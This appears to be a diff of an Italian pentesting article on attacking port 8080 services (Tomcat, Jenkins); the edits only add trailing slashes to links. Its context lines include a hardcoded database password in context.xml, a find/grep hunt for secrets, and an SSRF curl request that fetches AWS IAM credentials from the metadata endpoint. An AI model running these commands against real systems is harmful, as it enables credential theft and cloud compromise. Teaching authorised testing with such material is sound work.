@@ -18,7 +18,7 @@ tags:
 featured: true
 ---
 
-La porta 8080 TCP è la porta HTTP alternativa per eccellenza. Mentre la [porta 80](https://hackita.it/articoli/porta-80-http) ospita il sito principale dell'azienda — tipicamente dietro WAF, CDN e reverse proxy — la 8080 ospita tutto il resto: **Apache Tomcat** (il server Java più deployato del pianeta), **Jenkins** (CI/CD — se lo controlli, controlli il codice di produzione), **proxy HTTP** aziendali, pannelli di amministrazione e servizi interni che "tanto nessuno li vede". Ed è proprio quella mentalità che li rende i target preferiti di un penetration test.
+La porta 8080 TCP è la porta HTTP alternativa per eccellenza. Mentre la [porta 80](https://hackita.it/articoli/porta-80-http/) ospita il sito principale dell'azienda — tipicamente dietro WAF, CDN e reverse proxy — la 8080 ospita tutto il resto: **Apache Tomcat** (il server Java più deployato del pianeta), **Jenkins** (CI/CD — se lo controlli, controlli il codice di produzione), **proxy HTTP** aziendali, pannelli di amministrazione e servizi interni che "tanto nessuno li vede". Ed è proprio quella mentalità che li rende i target preferiti di un penetration test.
 
 Questo articolo copre in profondità Apache Tomcat (il servizio più comune sulla 8080), Jenkins (il secondo) e le **vulnerabilità OWASP Top 10** con payload operativi da testare su qualsiasi servizio web che trovi su questa porta. Non teoria: comandi pronti all'uso.
 
@@ -246,14 +246,14 @@ cat /opt/tomcat/webapps/ROOT/META-INF/context.xml
           username="webapp" password="W3bApp_DB_2025!"/>
 ```
 
-Credenziali [MySQL](https://hackita.it/articoli/porta-3306-mysql)/[PostgreSQL](https://hackita.it/articoli/porta-5432-postgresql).
+Credenziali [MySQL](https://hackita.it/articoli/porta-3306-mysql/)/[PostgreSQL](https://hackita.it/articoli/porta-5432-postgresql/).
 
 ```bash
 # Cerca .war files deployati (possono contenere credenziali)
 find /opt/tomcat/webapps -name "*.properties" -exec grep -liE "password|secret" {} \;
 ```
 
-Per l'escalation da utente tomcat: [Linux Privilege Escalation](https://hackita.it/articoli/linux-privesc).
+Per l'escalation da utente tomcat: [Linux Privilege Escalation](https://hackita.it/articoli/linux-privesc/).
 
 ***
 
@@ -501,7 +501,7 @@ done
 curl -s "http://10.10.10.40:8080/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
 ```
 
-Se ottieni credenziali AWS dal metadata → [AWS privilege escalation](https://hackita.it/articoli/aws-privilege-escalation).
+Se ottieni credenziali AWS dal metadata → [AWS privilege escalation](https://hackita.it/articoli/aws-privilege-escalation/).
 
 ***
 
